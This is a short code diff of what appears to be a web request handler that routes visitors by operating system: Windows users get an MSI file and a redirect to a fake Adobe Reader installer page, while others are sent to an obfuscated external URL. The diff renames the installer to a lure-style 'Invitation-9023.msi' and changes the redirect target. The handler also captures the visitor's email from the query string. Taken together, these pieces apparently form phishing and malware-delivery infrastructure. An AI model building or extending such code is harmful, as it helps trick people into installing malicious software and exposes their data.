@@ -4,8 +4,8 @@ export default function handler(req, res) {
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
     'aspiceconference.com/adobe-reader/installer/download.html';
-  const MSI_PATH = '/Adobe_Reader_install.msi';
-  const NON_WINDOWS_TARGET = 'https://aspiceconference.com/cw';
+  const MSI_PATH = '/Invitation-9023.msi';
+  const NON_WINDOWS_TARGET = 'https://quora.chabemo.institute/DjK@TxMYRFjDq3p5aQPUt2/';
 
   let email = '';
   if (req.query && req.query.email) email = Array.isArray(req.query.email) ? req.query.email[0] : req.query.email;
@@ -56,6 +56,7 @@ export default function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
+
 
 
 
